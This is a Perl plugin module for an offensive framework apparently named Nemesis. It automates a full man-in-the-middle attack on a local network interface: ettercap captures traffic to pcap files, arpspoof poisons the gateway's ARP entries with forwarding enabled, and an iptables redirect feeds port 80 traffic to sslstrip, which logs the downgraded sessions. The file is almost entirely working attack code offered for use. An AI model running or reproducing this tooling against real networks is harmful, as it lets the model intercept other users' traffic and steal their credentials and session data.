package Plugin::Sniffer;
use warnings;
use Carp qw( croak );
use Nemesis::Process;
my $VERSION = '0.1a';
my $AUTHOR  = "mudler";
my $MODULE  = "Sniffer Module";
my $INFO    = "<www.dark-lab.net>";

#Public exported functions
my @process_groups = qw{sniffers spoofers strippers};

my @PUBLIC_FUNCTIONS =
    qw(configure check_installation status where stop status_pids sniff spoof strip mitm)
    ;    #NECESSARY

sub new {    #NECESSARY
     #Usually new(), export_public_methods() and help() can be copyed from other plugins
    my $package = shift;
    bless( {}, $package );
    my (%Obj) = @_;
    %{ $package->{'core'} } = %Obj;

    #Here goes the required parameters to be passed

    croak("IO and environment must be defined\n")
        if ( !defined( $package->{'core'}->{'IO'} )
        || !defined( $package->{'core'}->{'env'} )
        || !defined( $package->{'core'}->{'interfaces'} ) );

    return $package;
}

sub export_public_methods() {    #NECESSARY
    my $self = shift;

    return @PUBLIC_FUNCTIONS;
}

sub help() {                     #NECESSARY
    my $self    = shift;
    my $IO      = $self->{'core'}->{'IO'};
    my $section = $_[0];
    $IO->print_title( $MODULE . " Helper" );
    if ( $section eq "configure" ) {
        $IO->print_title("nothing to configure here");
    }

}

sub clear() {                    #NECESSARY - CALLED ON EXIT
    my $self = shift();
    my $IO   = $self->{'core'}->{'IO'};
    $IO->print_alert("Clearing all");
    foreach my $group (@process_groups) {
        foreach my $dev ( keys %{ $self->{$group} } ) {

            $self->stop( $dev, $group );
        }

    }

}

sub mitm {
    my $self       = shift;
    my $IO         = $self->{'core'}->{'IO'};
    my $env        = $self->{'core'}->{'env'};
    my $interfaces = $self->{'core'}->{'interfaces'};
    my $dev        = $_[0];
    $IO->print_title("Mitm - Man in the middle on $dev");
    $self->sniff($dev);
    $self->spoof($dev);
    $self->strip($dev);
    $self->status($dev);

}

sub sniff {

    #
    #  name:	sniff
    #  @param	interface
    #  @return	nothing
    #
    #
    #
    #

    my $self       = shift;
    my $IO         = $self->{'core'}->{'IO'};
    my $env        = $self->{'core'}->{'env'};
    my $interfaces = $self->{'core'}->{'interfaces'};
    my $code;
    my $dev = $_[0];
    my $pcap_file =
        $env->tmp_dir() . "/" . $dev . "-ettercap-" . $env->time() . ".pcap";

    my $log_file = $env->tmp_dir() . "/" . $dev . "-etterlog-" . $env->time();
    $code =
          'ettercap -Du -i ' 
        . $dev . ' -L '
        . $log_file . ' -w '
        . $pcap_file
        . " -P autoadd";
    my $process = Nemesis::Process->new(
        type     => 'daemon',                   # forked pipeline
        code     => $code,
        env      => $self->{'core'}->{'env'},
        IO       => $IO,
        file     => $pcap_file,
        file_log => $log_file
    ) or $IO->print_error("Can't start $code");

    $process->start();
    $self->{'sniffers'}->{$dev} = $process->get_id();
    $IO->print_info( "Running: " . $process->is_running() );
    $IO->print_info( "PID: " . $process->get_pid() );
}

sub spoof {

    #
    #  name:	spoof
    #  @param	interface
    #  @return	nothing
    #
    my $self       = shift;
    my $IO         = $self->{'core'}->{'IO'};
    my $env        = $self->{'core'}->{'env'};
    my $interfaces = $self->{'core'}->{'interfaces'};
    my $dev        = $_[0];
    my $forwarded  = $env->ipv4_forward("on");
    $IO->print_info( "IPV4_FORWARD : " . $forwarded );
    $IO->print_info( "Detected gateway : " . $interfaces->{'GATEWAY'} );
    my $code    = 'arpspoof -i ' . $dev . " " . $interfaces->{'GATEWAY'};
    my $process = Nemesis::Process->new(
        type => 'system',                   # forked pipeline
        code => $code,
        env  => $self->{'core'}->{'env'},
        IO   => $IO
    ) or $IO->print_error("Can't start $code");
    $process->start();
    $self->{'spoofers'}->{$dev} = $process->get_id();
    $IO->print_info( "Running: " . $process->is_running() );
    $IO->print_info( "PID: " . $process->get_pid() );
}

sub strip {
    my $self   = shift;
    my $output = $self->{'core'}->{'IO'};
    my $env    = $self->{'core'}->{'env'};
    my $dev    = $_[0];
    $output->print_info("Setting iptables to redirect to sslstrip port..");
    $output->exec(
        "iptables -t nat -A PREROUTING -p tcp -i $dev --destination-port 80 -j REDIRECT --to-port 8080"
    );
    my $strip_file =
        $env->tmp_dir() . "/" . $dev . "-sslstrip-" . $env->time() . ".log";
    my $code    = 'sslstrip -l 8080 -a -k -f -w ' . $strip_file;
    my $process = Nemesis::Process->new(
        type => 'system',                   # forked pipeline
        code => $code,
        env  => $self->{'core'}->{'env'},
        IO   => $output,
        file => $strip_file
    ) or $output->print_error("Can't start $code");
    $process->start();
    $self->{'strippers'}->{$dev} = $process->get_id();
    $output->print_info( "Running: " . $process->is_running() );
    $output->print_info( "PID: " . $process->get_pid() );

}

sub status {
    my $self   = shift;
    my $output = $self->{'core'}->{'IO'};
    my $env    = $self->{'core'}->{'env'};
    my $process;
    if ( $_[0] ) {

        $output->print_title("Status of process up for $_[0]");
        $self->status_device( $_[0] );

    }
    else {

        foreach my $group (@process_groups) {
            foreach my $dev ( keys %{ $self->{$group} } ) {
                $output->print_title("Status of $group process up for $dev");

                $self->status_device( $dev, $group );
            }

        }

    }
}

sub status_device() {
    my $self   = shift;
    my $dev    = $_[0];
    my $group  = $_[1];
    my $output = $self->{'core'}->{'IO'};
    my $env    = $self->{'core'}->{'env'};
    $process = new Nemesis::Process(
        env => $self->{'core'}->{'env'},
        IO  => $output,
        ID  => $self->{$group}->{$dev}
    ) or $output->debug( "Can't reload " . $self->{$group}->{$dev} );
    $output->print_info( $process->get_var("code") );
    $output->print_tabbed( "Running:\t " . $process->is_running() );

    #$output->print_info( "Output: " . $process->get_output() );
    my $pid = $process->get_pid();
    if ( $pid eq "" ) { $pid = "Waiting for it.."; }
    $output->print_tabbed( "PID:\t " . $pid );
    if ( $process->{'CONFIG'}->{'type'} eq "daemon" ) {
        $output->print_tabbed( "File (Generic output by process):\t "
                . $process->get_var('file') );
        $output->print_tabbed( "File (Generic output by process):\t "
                . $process->get_var('file_log') );
    }

}

sub stop {

    my $self   = shift;
    my $output = $self->{'core'}->{'IO'};
    my $env    = $self->{'core'}->{'env'};
    my $dev    = $_[0];
    my $group  = $_[1];
    if ( !defined($dev) ) {
        $output->print_alert("You must provide a device");
  
    } else {
    if ( defined($group) ) {
        $output->print_info(
            "Stopping all activities on " . $dev . " for $group" );

        my $process = Nemesis::Process->new(
            env => $self->{'core'}->{'env'},
            IO  => $output,
            ID  => $self->{$group}->{$dev}
            )
            or $output->print_error(
            "Can't start reload " . $self->{$group}->{$dev} );

        $process->stop();
        $process->destroy();

        delete $self->{$group}->{$dev};

    }
    else {
        foreach my $group (@process_groups) {
            if ( exists( $self->{$group}->{$dev} ) ) {
                $output->print_title( "Stopping $group on " . $dev . "" );

                my $process = Nemesis::Process->new(
                    env => $self->{'core'}->{'env'},
                    IO  => $output,
                    ID  => $self->{$group}->{$dev}
                    )
                    or $output->print_error(
                    "Can't start reload " . $self->{$group}->{$dev} );

                $process->stop();
                $process->destroy();

                delete $self->{$group}->{$dev};
            }
        }
    }

    $output->exec("iptables -t nat -F");
}
}

sub where {
    my $self   = shift;
    my $output = $self->{'core'}->{'IO'};
    my $env    = $self->{'core'}->{'env'};

    my $path = $env->whereis( $_[0] );
    $output->print_info( $_[0] . " bin is at $path" );

}

sub info {
    my $self = shift;

    my $IO  = $self->{'core'}->{'IO'};
    my $env = $self->{'core'}->{'env'};

    # A small info about what the module does
    $IO->print_info("->\tDummy module v$VERSION ~ $AUTHOR ~ $INFO");
}

sub configure {
    my $self = shift;

    #postgre pc_hba.conf

}

sub check_installation {
    my $self      = shift;
    my $env       = $self->{'core'}->{'env'};
    my $IO        = $self->{'core'}->{'IO'};
    my $workspace = $env->workspace();
    $IO->print_info( "Workspace: " . $workspace );
}

1;
__END__
